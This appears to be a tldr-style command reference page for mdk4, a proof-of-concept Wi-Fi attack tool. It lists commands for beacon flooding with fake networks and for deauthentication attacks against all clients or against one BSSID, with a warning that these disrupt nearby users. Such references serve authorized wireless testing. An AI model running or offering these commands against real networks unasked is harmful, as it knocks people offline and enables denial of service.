# mdk4

> A proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
> Note: Exercise extreme caution as this tool can disrupt Wi-Fi networks and disconnect nearby users.
> See also: `airodump-ng`, `airmon-ng`.
> More information: <https://github.com/aircrack-ng/mdk4>.

- Flood access points with beacon frames to create fake networks (set interface to monitor mode with `sudo airmon-ng start <wifi_interface>` if needed):

`sudo mdk4 {{wifi_interface}} b -f {{path/to/beacons.txt}}`

- Perform deauthentication attack against all clients on all BSSIDs:

`sudo mdk4 {{wifi_interface}} d`

- Perform deauthentication attack on a specific BSSID (list BSSIDs using `sudo airodump-ng <wifi_interface>`):

`sudo mdk4 {{wifi_interface}} d -B {{BSSID}}`
